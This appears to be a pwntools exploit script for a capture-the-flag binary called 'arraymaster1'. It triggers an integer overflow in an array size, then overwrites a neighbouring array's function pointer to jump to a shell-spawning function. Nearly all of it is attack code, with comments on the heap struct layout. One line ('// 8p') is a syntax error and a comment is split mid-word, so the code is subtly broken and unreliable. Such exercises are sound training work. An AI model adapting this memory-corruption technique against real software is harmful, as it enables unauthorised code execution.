from pwn import *

p = process('./arraymaster1')

gdb.attach(p, f'''
break *0x004014f9
break *0x0040151b
''')

spawn_shell = 0x401382

# Create array A with overflowed size
print(p.sendlineafter(b"command you want to", "init A 32 {}".format(2**62+1).encode()))

# Create array B - its control structure should be after A's data
print(p.sendlineafter(b"command you want to", b"init B 32 1"))

# Calculate offset to B's get function pointer
# Array structure is 40 bytes:
# - 0x00: size (8

# - 0x08: chunk_size (8)
# - 0x10: data_ptr (8)
# - 0x18: get_func (8)  <-- target
# - 0x20: set_func (8)

# Assuming A's data is just before B's control struct
offset = (0x20 + 0x18) // 8p
print(p.sendlineafter(b"command you want to", "set A {} {}".format(offset, spawn_shell).encode()))

# Trigger via B's get
p.sendlineafter(b"command you want to", b"get B 0")

p.interactive()
